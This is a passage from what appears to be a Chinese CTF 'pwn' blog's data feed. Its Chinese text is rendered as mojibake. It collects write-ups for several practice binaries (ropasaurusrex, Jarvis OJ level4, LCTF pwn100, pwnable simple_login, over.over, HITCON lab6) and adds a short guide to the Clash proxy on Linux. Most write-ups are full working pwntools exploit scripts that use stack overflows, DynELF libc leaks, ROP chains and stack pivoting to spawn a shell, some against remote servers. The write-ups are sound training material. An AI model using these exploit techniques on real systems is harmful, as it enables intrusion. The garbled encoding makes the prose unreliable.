ropasaurusrexæŸ¥ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)idaåˆ†æssize_t sub_80483F4() { char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u); }å‡½æ•°ååˆ†ç®€å•ï¼Œæº¢å‡ºåœ¨è¿™ä¸ªä½ç½®ã€‚å¹¶ä¸”plté‡Œé¢æœ‰writeå‡½æ•°ï¼Œç„¶åå°±ç”¨å®ƒæ¥æ³„éœ²ã€‚ expfrom pwn import * io = process(&apos;./ropasaurusrex&apos;) elf = ELF(&apos;./ropasaurusrex&apos;) buf = 0x8049620 padding = 140 write_add = elf.symbols[&apos;write&apos;] start_addr = 0x08048340 def leak(addr): p = &apos;&apos; p += padding * &apos;a&apos; p += p32(write_add) p += p32(start_addr) p += p32(1) p += p32(addr) p += p32(0x4) io.sendline(p) content = io.recv(4) # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak,elf=elf) system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;) log.info(&quot;system_add = %x&quot;, system_add) log.info(&quot;read_add = %x&quot;, read_add) p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8) io.sendline(p) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()Jarvis_oj_leave4æŸ¥ä¿æŠ¤å’Œarch[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)idaåˆ†æ ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u); }æ¼æ´å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ã€‚ expfrom pwn import * import time # context.log_level = &apos;debug&apos; context.arch = &apos;i386&apos; # io = process(&apos;./level4&apos;) io = remote(&apos;pwn2.jarvisoj.com&apos;,9880) elf = ELF(&apos;./level4&apos;) __libc_start_main_got = elf.got[&apos;__libc_start_main&apos;] write_plt = elf.symbols[&apos;write&apos;] start_addr = 0x08048350 padding = 140 def leak(addr): payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4) io.sendline(payload) data = io.recv(4) print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;))) return data d = DynELF(leak,elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) info(&apos;system_addr = %#x&apos; %system_addr) read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;) info(&apos;read_addr = %#x&apos; %read_addr) binsh_add = 0x804A01C payload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8) io.sendline(payload) sleep(0.1) io.sendline(&apos;/bin/sh\\x00&apos;) io.interactive()ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²printf, putsè¿™ç±»å‡½æ•°çš„ç‰¹ç‚¹æ˜¯ä¼šè¢«ç‰¹æ®Šå­—ç¬¦å½±å“ï¼Œputsçš„åŸå‹æ˜¯puts(addr)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°â€œx00â€å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œputså‡½æ•°è¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯ä¸å—æ§çš„ï¼Œåªè¦æˆ‘ä»¬è¾“å‡ºçš„ä¿¡æ¯ä¸­åŒ…å«x00æˆªæ–­ç¬¦ï¼Œè¾“å‡ºå°±ä¼šç»ˆæ­¢ï¼Œä¸”ä¼šè‡ªåŠ¨å°†â€œnâ€è¿½åŠ åˆ°è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ˜¯putså‡½æ•°çš„ç¼ºç‚¹ï¼Œè€Œä¼˜ç‚¹å°±æ˜¯éœ€è¦çš„å‚æ•°å°‘ï¼Œåªæœ‰1ä¸ªï¼Œæ— è®ºåœ¨x32è¿˜æ˜¯x64ç¯å¢ƒä¸‹ï¼Œéƒ½å®¹æ˜“è°ƒç”¨ã€‚ é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºleakå‡½æ•°æ¨¡æ¿ def leak(address): count = 0 content = â€˜â€™ payload = xxx p.send(payload) print p.recvuntil(â€˜xxxnâ€™) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º up = â€œâ€ while True: c = p.recv(numb=1, timeout=0.1) count += 1 if up == â€˜\\nâ€™ and c == â€œâ€: #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™ content += content[:-1] +â€™\\x00â€™ #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦ break else: content += c up = c content = content[:4] #å–æŒ‡å®šå­—èŠ‚æ•° log.info(â€œ%#x =&gt; %sâ€ % (address, (content or â€˜â€™).encode(â€˜hexâ€™))) return contentå…¶ä¸­c = p.recv(numb=1, timeout=0.1)ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…0.1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†ã€‚ä»¥ä¾¿ä¸ä¸æ˜¯æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œè¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€ putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡ºdef leak(address): count = 0 content = &quot;&quot; payload = xxx p.send(payload) print p.recvuntil(&quot;xxxn&quot;)) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º up = &quot;&quot; while True: c = p.recv(1) count += 1 if up == &apos;\\n&apos; and c == &quot;x&quot;: #ä¸€å®šè¦æ‰¾åˆ°æ³„æ¼ä¿¡æ¯çš„å­—ç¬¦ä¸²ç‰¹å¾ content = content[:-1] + &quot;x00&quot; break else: content += c up = c content = content[:4] log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;))) return contentLctf_2016_pwn100æŸ¥ä¿æŠ¤å’Œarch[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)idaåˆ†æint sub_40068E() { char v1; // [rsp+0h] [rbp-40h] sub_40063D((__int64)&amp;v1, 200); return puts(&quot;bye~&quot;); } __int64 __fastcall sub_40063D(__int64 a1, signed int a2) { __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); } return result; }ä¸»è¦çš„æ¼æ´å‡½æ•°åœ¨è¿™ä¸¤ä¸ªã€‚è¿™äºŒä¸ªå‡½æ•°ç»“åˆèµ·æ¥å¼•èµ·æ ˆæº¢å‡ºï¼Œç¬¬äºŒä¸ªå‡½æ•°è¿˜å¯¹è¯»å…¥æ•°æ®åšäº†å¤„ç†ï¼Œæˆ‘ä»¬è¦ä¿è¯é€è¿‡å»200çš„ä¸ªè‡ªå·±ï¼Œæ³¨æ„è¦ç”¨sendå‘ã€‚ å› ä¸ºå…¶æœ‰putså‡½æ•°ï¼Œè¿™æ¬¡å°±ç”¨putså‡½æ•°æ¥è¿›è¡Œleakã€‚ç­‰leakå‡ºæ¥ä»¥åï¼Œè¿”å›startæ¸…ç†æ ˆï¼Œå†ç”¨dynelfæ‰¾å‡ºsystemï¼Œå’Œreadå‡½æ•°çš„åœ°å€ã€‚ ç¬¬äºŒæ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œç”¨readå‡½æ•°è¯»system(/bin/sh)åˆ°ä¸€ä¸ªç¡®å®šçš„åœ°å€ï¼Œè¿˜æ˜¯ä¼šåˆ°startå¤„ã€‚ ç¬¬ä¸‰æ¬¡æ„é€ æ—¶å€™ï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨systemå‡½æ•°çš„ropé“¾å³å¯ã€‚ å…¶ä¸­å¯¹äºreadè¿™ä¸ªå‡½æ•°ï¼Œrdxè¿™ä¸ªå‚æ•°å°±å¾—ç”¨ä¸‡èƒ½gadgetæ¥æ§åˆ¶äº†ã€‚ exp#coding:utf-8 from pwn import * context.arch = &apos;amd64&apos; # context.log_level = &apos;info&apos; io = process(&apos;./pwn100&apos;) elf = ELF(&apos;./pwn100&apos;) # libc = elf.libc padding = 72 puts_plt = elf.plt[&apos;puts&apos;] read_got = elf.got[&apos;read&apos;] start_add = 0x000400550 pop_rdi = 0x400763 def leak(addr): payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)] payload = payload.ljust(200,&apos;b&apos;) io.send(payload) count = 0 up = &apos;&apos; content = &apos;&apos; io.recvuntil(&apos;bye~\\n&apos;) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º while True: c = io.recv(numb=1, timeout=0.1) count += 1 if up == &apos;\\n&apos; and c == &quot;&quot;: #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™ content = content[:-1] +&apos;\\x00&apos; #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦ break content += c else: up = c content = content[:4] #å–æŒ‡å®šå­—èŠ‚æ•° log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;))) return content d = DynELF(leak, elf = elf) system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;) log.info(&apos;system_addr = %#x&apos; %system_addr) binsh_addr = 0x601068 - 8 payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\\x00&apos;*56,start_add]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.recvuntil(&apos;bye~\\n&apos;) io.send(&apos;/bin/sh\\x00&apos;) payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr]) payload = payload.ljust(200,&apos;b&apos;) io.send(payload) io.interactive()å…¶ä»–è·å–libcçš„æ–¹æ³•è™½ç„¶DynELFæ˜¯ä¸€ä¸ªdumpåˆ©å™¨ï¼Œä½†æ˜¯å¦‚æœå†™ä¸å‡ºæ¥leakå‡½æ•°ï¼Œä¸‹libcè¢«å¢™ç­‰ç­‰ã€‚å°±ç”¨è¿™ä¸¤ä¸ªç½‘ç«™ï¼šhttp://libcdb.com/https://libc.blukat.me/éƒ½æ˜¯åªæœ‰æœ‰ä¸¤ä¸ªæ³„éœ²åœ°å€ï¼Œå°±å¯ä»¥æŸ¥åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥ç»™å‡ºå…¶åŸä»¶ï¼Œæ¥ç€å°±å¯ä»¥è¿›è¡Œå…¶ä»–æ“ä½œã€‚ è¿˜æœ‰åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸€ä¸ªé¢˜ç›®ä¸å¥½è·å–åˆ°libcï¼Œé‚£ä¹ˆå¯ä»¥çœ‹çœ‹å…¶ä»–é¢˜ç›®çš„libcï¼Œæœ‰å¯èƒ½è¿™ä¸ªèµ›äº‹å¹³å°æœåŠ¡å™¨éƒ½æ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"linuxä¸‹clashçš„ä½¿ç”¨","slug":"linuxä¸‹clashçš„ä½¿ç”¨","date":"2020-02-14T15:27:09.000Z","updated":"2020-02-28T07:49:58.000Z","comments":true,"path":"2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/","link":"","permalink":"http://chumen77.xyz/2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/","excerpt":"","text":"linuxä¸‹clashçš„ä½¿ç”¨å‰è¨€æœ¬æ–‡åªæ˜¯å¾ˆç®€å•è®°å½•ä¸€ä¸‹ï¼Œè‡ªå·±å¦‚ä½•ä½¿ç”¨clashçš„ã€‚å› ä¸ºå‘ç°ç»ˆç«¯è™½è¯´åœ¨æœ¬æœºä¸Šå·²ç»å¼€äº†ä»£ç†ï¼Œä½†æ˜¯ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ä¸‹è½½ä¸œè¥¿çš„æ—¶å€™ååˆ†çš„å¡ï¼Œä»Šå¤©æ‰äº†è§£åˆ°ï¼ŒåŸæ¥ç»ˆç«¯çš„ä»£ç†æ˜¯å¦å¤–å¼€çš„ã€‚æ‰€ä»¥å°±å¼€å§‹æŠ˜è…¾ä¸€ä¸‹ï¼Œlinuxä¸‹clashçš„ä½¿ç”¨ï¼ˆæœ¬äººç”¨äº†å¾ˆä¹…äº†clashï¼Œæ‰€ä»¥ç›´æ¥çœ‹è¿™ä¸ªè½¯ä»¶äº†ï¼‰ã€‚ 0x01æ‰§è¡Œcd &amp;&amp; mkdir clash åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»º clash æ–‡ä»¶å¤¹ã€‚ä¸‹è½½é€‚åˆçš„ Clash äºŒè¿›åˆ¶æ–‡ä»¶å¹¶è§£å‹é‡å‘½åä¸º clash,ä¸€èˆ¬ä¸ªäººçš„64ä½ç”µè„‘ä¸‹è½½ clash-linux-amd64.tar.gz å³å¯ã€‚åœ°å€ï¼šhttps://github.com/Dreamacro/clash/releases 0x02åœ¨ç»ˆç«¯cdåˆ°ClashäºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•,æŠŠClash é…ç½®æ–‡ä»¶ç»™ç§»è¿›å»ã€‚é…ç½®æ–‡ä»¶çš„åç§°è¦æ˜¯config.yaml æˆ‘æ˜¯ç›´æ¥åˆ›å»ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥çš„è‡ªå·±çš„é…ç½®ï¼Œå› ä¸ºmacæœ¬æœºä¸€ç›´ç”¨è¿™ä¸ªè½¯ä»¶ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶æ‰¾åˆ°ä¸»ä½¿ç”¨é‚£ä¸ªï¼Œç›´æ¥å¤åˆ¶é‚£ä¸ªè‡ªå·±ä½¿ç”¨ä»£ç†ç½‘ç«™åŠ è½½ä¸‹æ¥çš„é…ç½®ç»™config.yamlã€‚ 0x03chmod +x ./clashåŠ æ‰§è¡Œæƒé™æ‰§è¡Œ ./clash -d . å³å¯å¯åŠ¨ Clashï¼ŒåŒæ—¶å¯åŠ¨ HTTP ä»£ç†å’Œ Socks5 ä»£ç†ã€‚ç„¶åè¿›å…¥è¿™ä¸ªhttp://clash.razord.top/ é“¾æ¥å¯ä»¥å¯¹ä»£ç†è¿›è¡Œä¸ªç®€å•ç®¡ç† 0x04æ‰“å¼€ç³»ç»Ÿè®¾ç½®ï¼Œé€‰æ‹©ç½‘ç»œï¼Œç‚¹å‡»ç½‘ç»œä»£ç†å³è¾¹çš„ âš™ æŒ‰é’®ï¼Œé€‰æ‹©æ‰‹åŠ¨ï¼Œå¡«å†™ HTTP å’Œ HTTPS ä»£ç†ä¸º 127.0.0.1:7890ï¼Œå¡«å†™ Socks ä¸»æœºä¸º 127.0.0.1:7891ï¼Œå³å¯å¯ç”¨ç³»ç»Ÿä»£ç†ã€‚ 0x05ç»ˆç«¯å¼€å¯ä»£ç†export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å³å¯ã€‚å‡ºç°è¿™ä¸ªå°±æ˜¯ä»£ç†æˆåŠŸäº†ï¼Œç„¶åå°±ä¼šå‘ç°ç»ˆç«¯ä¸‹è½½ä¸œè¥¿çš„ç¥é€Ÿã€‚","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"Stack Migrationé¢˜ç›®ç»ƒä¹ ","slug":"Stack Migrationé¢˜ç›®ç»ƒä¹ ","date":"2020-02-11T13:51:48.000Z","updated":"2020-02-28T07:51:31.000Z","comments":true,"path":"2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /","link":"","permalink":"http://chumen77.xyz/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /","excerpt":"","text":"Stack Migrationé¢˜ç›®ç»ƒä¹ å‰è¨€è®°å½•å‡ é“Stack Migrationçš„ç»ƒä¹ é¢˜ã€‚ pwnable_simple_loginæŸ¥çœ‹ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 32ä½ç¨‹åºï¼Œå¼€äº†nxå’ŒCanaryä¿æŠ¤ã€‚ idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; int de_s; // [esp+18h] [ebp-28h] char s; // [esp+1Eh] [ebp-22h] unsigned int de_length; // [esp+3Ch] [ebp-4h] memset(&amp;s, 0, 0x1Eu); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); printf(\"Authenticate : \"); _isoc99_scanf(\"%30s\", &amp;s); memset(&amp;input, 0, 0xCu); de_s = 0; de_length = Base64Decode((int)&amp;s, &amp;de_s); // v6 = è§£ç åçš„é•¿åº¦ if ( de_length &gt; 0xC ) &#123; puts(\"Wrong Length\"); &#125; else &#123; memcpy(&amp;input, de_s, de_length); // æ‰§è¡Œå®Œï¼ŒæŠŠè§£ç åçš„å­—æ®µï¼Œæ”¾å…¥inputçš„bsså†…å­˜ä¸Š if ( auth(de_length) == 1 ) correct(); &#125; return 0; &#125; ï¼ˆå…¶ä¸­å·²ç»æ”¹äº†éƒ¨åˆ†å˜é‡çš„åç§°æ–¹ä¾¿è¯»ä»£ç ï¼‰æµç¨‹å°±æ˜¯æ¥å—ä¸€æ®µbase64ç¼–ç è¿‡çš„å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œä¸€ä¸‹è§£ç ï¼Œè§£ç è¿”å›é•¿åº¦ç»™å˜é‡ï¼Œä¸”åšä¸12å¤§å°çš„æ¯”è¾ƒï¼Œå¦‚æœè§£ç åå¤§äº12ï¼Œå°±ç›´æ¥é€€å‡ºç¨‹åºï¼Œå¹¶ä¸”è§£ç çš„å­—ç¬¦ä¸²æ˜¯æ”¾åœ¨inputçš„è¿™ä¸ªå…¨å±€å˜é‡é‡Œï¼šæ¥ç€è¿›å…¥authå‡½æ•°åˆ†æä¸€ä¸‹ï¼š _BOOL4 __cdecl auth(int length) &#123; char v2; // [esp+14h] [ebp-14h] char *s2; // [esp+1Ch] [ebp-Ch] int v4; // [esp+20h] [ebp-8h] memcpy(&amp;v4, &amp;input, length); s2 = (char *)calc_md5((int)&amp;v2, 12); printf(\"hash : %s\\n\", s2); return strcmp(\"f87cd601aa7fedca99018a8be88eda34\", s2) == 0; &#125; å¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªmd5åŠ å¯†åï¼Œç„¶åè·Ÿåé¢é‚£ä¸²å­—ç¬¦ä¸²å¯¹æ¯”ã€‚å¹¶ä¸”çœ‹ä¸€ä¸‹v4å˜é‡ï¼šå‘ç°memcpyè¿™ä¸ªå‡½æ•°ä¼šå¼•èµ·æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¯æ§çš„åªæ˜¯12-8 = 4å­—èŠ‚ã€‚ç„¶åè¾“å…¥12ä½â€˜1â€™ï¼Œç¼–ç åæ”¾å…¥ç¨‹åºï¼Œå‘ç°æœ€åçš„4ä¸ªå­—èŠ‚è¢«æ”¾å…¥äº†ebpï¼Œæ­£å¥½è¿™ä¸‹å°±å¯ä»¥æ§åˆ¶ebpäº†ã€‚æ¥ç€å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼š æ”»å‡»æ€è·¯æ§åˆ¶å¥½è¿™ä¸ªebpï¼Œç„¶åç”±äºè¿™ä¸ªç¨‹åºä¸­ï¼Œauthå‡½æ•°æœ€åæœ‰ä¸€ä¸ªleave ret çš„gadgetï¼Œmainå‡½æ•°ä¹Ÿæœ‰ä¸€ä¸ªï¼Œæ­£å¥½æ»¡è¶³æˆ‘ä»¬æ¥Stack Migrationã€‚åœ¨æ ˆä¸Šæ‘†æ”¾çš„ç»“æ„ä¸ºï¼šåˆ°æ—¶å€™ç”±äºmemcpyä¼šå¤åˆ¶è¿™ä¸ªè€æ ˆçš„å‰12ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶ånew espæŒ‡å‘çš„æ˜¯å›ºå®šä½ç½®inputã€‚ç„¶åä¸¤ä¸ªleave gadgetå³å¯ EXPfrom pwn import * from base64 import * # io = process('./login') io = remote('node3.buuoj.cn',29026) system_add = 0x08049284 buf = 0x0811EB40 io.recvuntil('e : ') p = 'aaaa' + p32(system_add) + p32(buf) io.sendline(b64encode(p)) io.interactive() å®‰æ’æœˆèµ›_over.overæŸ¥ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64ä½ï¼Œåªå¼€äº†nx idaåˆ†æ__int64 __fastcall main(__int64 a1, char **a2, char **a3) &#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); while ( sub_400676() ) ; return 0LL; &#125; ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œä¸»è¦æ ¸å¿ƒå°±åœ¨whileåŒ…è£¹çš„å‡½æ•°: int sub_400676() &#123; char buf; // [rsp+0h] [rbp-50h] memset(&amp;buf, 0, 0x50uLL); putchar('&gt;'); read(0, &amp;buf, 0x60uLL); return puts(&amp;buf); &#125; å¯ä»¥çœ‹åˆ°æº¢å‡ºå¯æ§è‡ªå·±åªæœ‰8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªgadgetï¼Œæ˜æ˜¾éœ€è¦Stack Migrationï¼Œé‚£ä¹ˆå°±å¾—æ§åˆ¶å¥½ebpï¼Œpaddingå³ä¸º0x50ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æ²¡æœ‰ç»™æˆ‘ä»¬å›ºå®šçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å…¨å±€å˜é‡å¯ç”¨ï¼Œé‚£å°±æƒ³åŠæ³•çœ‹æ ˆåç§»äº†ã€‚ å¯ä»¥çœ‹åˆ°æ˜¯readå‡½æ•°ï¼Œå’Œputså‡½æ•°çš„æ­é…ï¼Œå½“å¾€é‡Œé¢å¡0x50å­—èŠ‚å­—ç¬¦æ˜¯ä¸ä¼šæ·»åŠ ä¸Šâ€™\\x00â€™çš„: ç„¶åç”¨putså‡½æ•°è¾“å‡ºæ—¶ä¼šæŠŠebpé‡Œé¢çš„å€¼ä¹Ÿä¼šè¾“å‡ºå‡ºæ¥ã€‚è¿™ä¸‹æ ˆåç§»æ˜¯å›ºå®šçš„ï¼Œå°±å¯ä»¥åœ¨readçš„æ—¶å€™å¾€é‡Œé¢å¡ropé“¾ï¼Œä¾é åç§»æ¥è·³ä¸Šå»æ‰§è¡Œå°±å¯ä»¥äº†ã€‚ç®—ä¸€ä¸‹mainçš„ebpä¸ç°åœ¨çš„espå·®è·æ˜¯112ä¸ªå­—èŠ‚ã€‚è®©ebp-112å°±ç­‰äºespæŒ‡å‘äº†æ ˆé¡¶espã€‚ æ”»å‡»æ€è·¯å…ˆç»™ç¨‹åº0x50ä¸ªå­—èŠ‚ï¼Œç„¶åæ¥æ”¶ä¸‹mainçš„ebpå€¼ã€‚ç„¶åç¨‹åºç”±äºwhileå¾ªç¯å†æ¬¡ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ—¶å€™é€ropé“¾ï¼Œç¬¬ä¸€ä¸ªropé“¾å¯ä»¥å…ˆæ³„éœ²ä¸‹putsçš„å†…å­˜åœ°å€ï¼Œç„¶åè®¡ç®—libcçš„åœ°å€ï¼Œè¿”å›åœ°å€å†™æˆä¸»å‡½æ•°startï¼Œæ¸…ç†ä¸‹æ ˆã€‚ç„¶åç¬¬äºŒæ¬¡è¯»çš„æ—¶å€™ï¼Œé€è¿‡å»system(/bin/sh)çš„ropé“¾å³å¯ã€‚ç¨‹åºæ¯æ¬¡è¯»ï¼Œæ„é€ å¥½ropé“¾çš„æ—¶å€™ï¼Œè¦ä¿è¯é€è¿‡å»80å­—èŠ‚ï¼Œç„¶åæ§åˆ¶ebp ä¸ºæ ˆé¡¶espï¼Œè¿˜æœ‰åŠ ä¸Šleave çš„gadgetï¼Œè¿™ä¸‹ä¸¤ä¸ªleaveçš„gadgetå°±è®©ç¨‹åºè·³å›æ ˆå¤´çš„ä¸‹ä¸ª8ä¸ªå­—èŠ‚ï¼Œå¼€å§‹æ‰§è¡Œropé“¾ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./over.over') e = ELF('./over.over') l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') leave_ret = 0x004006be pop_rdi_ret = 0x0400793 put_got = e.got['puts'] put_plt = e.symbols['puts'] padding = 80 raw_input('-&gt;') io.sendafter(\"&gt;\", 'a' * 80) # stack = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 0x70 stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70 io.readuntil('&gt;') print(hex(stack)) p = flat(['11111111',pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*'1',stack,leave_ret]) raw_input('-&gt;') io.send(p) libc = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - l.symbols['puts'] print(hex(libc)) io.sendafter(\"&gt;\", 'a' * 80) stack = u64((io.recvline())[80:86].ljust(8,'\\x00')) - 0x70 print(hex(stack)) io.readuntil('&gt;') system_add = libc + l.symbols['system'] binsh_add = libc + l.search('/bin/sh\\x00').next() p = flat(['22222222',pop_rdi_ret,binsh_add,system_add,(80-4*8)*'2',stack,leave_ret]) io.send(p) io.interactive() HITCON_training_lab6æºç #include &lt;stdio.h&gt; int count = 1337 ; char *t= \"Z\\xc3\" ; int main()&#123; if( count!=1337 )&#123; _exit(1); &#125; count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(\"Try your best : \" ); read(0, buf,128); return ; &#125; gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration ç¼–è¯‘å‘½ä»¤ã€‚ç„¶åå°±ä¸åˆ†æäº†ï¼Œå‰é¢ç»ƒä¹ 64ä½æ—¶å€™å†™çš„é‚£ä¸ªåšå®¢å·²ç»è®°å½•å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œåªè®°å½•ä¸‹expã€‚ expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' # io = process('./migration') io = remote('127.0.0.1',4000) e = ELF('./migration') l = ELF('/lib/i386-linux-gnu/libc-2.23.so') padding = 40 puts_plt = e.symbols['puts'] puts_got = e.got['puts'] read = e.symbols['read'] leave_ret = 0x08048418 buf1 = 0x0804b000 - 0x100 buf2 = buf1 - 0x50 pop_edx_ret = 0x0804836d p = 'a' * padding + flat([buf1,read,leave_ret,0,buf1,0x50]) io.readuntil(':\\n') io.send(p) p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50]) sleep(0.1) raw_input('-&gt;') io.sendline(p) puts_add = u32(io.recv(4)) libc = puts_add - l.symbols['puts'] print(hex(libc)) system_add = l.symbols['system'] + libc binsh_add = l.search('/bin/sh\\x00').next() + libc p = flat([buf1,system_add,system_add,binsh_add]) raw_input('-&gt;') # sleep(0.1) io.sendline(p) io.interactive() spwnæŸ¥ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å°è¯•è¿è¡Œ idaåˆ†æç›´æ¥çœ‹æ¼æ´å‡½æ•° 